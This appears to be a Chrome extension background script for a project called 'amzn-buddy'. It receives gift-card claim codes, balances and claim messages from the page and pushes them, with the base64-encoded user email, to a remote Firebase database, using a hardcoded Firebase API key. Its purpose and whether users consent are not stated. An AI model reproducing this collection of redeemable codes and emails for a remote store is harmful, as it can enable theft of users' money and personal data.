// Your web app's Firebase configuration
var firebaseConfig = {
    apiKey: "AIzaSyDLqt51UeNxyjlSqA5znH06WH8D0zwCHRU",
    authDomain: "amzn-buddy.firebaseapp.com",
    databaseURL: "https://amzn-buddy.firebaseio.com",
    projectId: "amzn-buddy",
    storageBucket: "amzn-buddy.appspot.com",
    messagingSenderId: "1056312450993",
    appId: "1:1056312450993:web:4637db4840e9c873a36790"
  };
// Initialize Firebase
firebase.initializeApp(firebaseConfig);

console.log("firebase initializeApp",firebase);

chrome.runtime.onMessage.addListener((msg, sender, response) => 
{
	console.log(msg);

	if (msg.command == "post" && msg.type == "giftcard-data") 
	{
		console.log("Starting Post To firebase");

		var gift_card_data = msg.giftCardData;
		console.log('gift_card_data', gift_card_data);

		var gift_card_claim_code = gift_card_data.gift_card_claim_code;

		var time_stamp = gift_card_data.time_stamp;

		var gift_card_claim_message = gift_card_data.gift_card_claim_message;
		var b64_gift_card_claim_message = btoa(gift_card_claim_message);
		var enc_gift_card_claim_message = encodeURIComponent(gift_card_claim_message).replace(/\./g, '%2E');

		var current_balance = gift_card_data.current_balance;




		var referenceDomain = '/email-id';

		var savedEmail = localStorage.getItem("email");
		console.log("savedEmail",savedEmail);
		var enc_email = btoa(savedEmail);
		//var enc_email = btoa(msg.email);

		//referenceDomain = '/'+referenceDomain +'/'+ enc_email +'/'+msg.type;
		referenceDomain = referenceDomain +'/'+ enc_email+'/'+msg.type;

		//this works
		//referenceDomain = "/domain/" + enc_email;

		try {
			var newPost = firebase
				.database()
				.ref(referenceDomain)
				.push()
				.set({
					"gift_card_claim_code": gift_card_claim_code,
					"enc_gift_card_claim_message": enc_gift_card_claim_message,
					"time_stamp": time_stamp,
					"current_balance": current_balance,
					"b64_gift_card_claim_message": b64_gift_card_claim_message,

				});



			var postId = newPost.key;
			console.log("postId",postId);

			response({
				type: "result",
				status: "success",
				data: postId,
				request: msg,
			});


		} catch (error) 
		{
			console.log("error: ", error);
			response({
				type: "result",
				status: "error",
				data: error,
				request: msg,
			});
		}
	}




	return true;
});
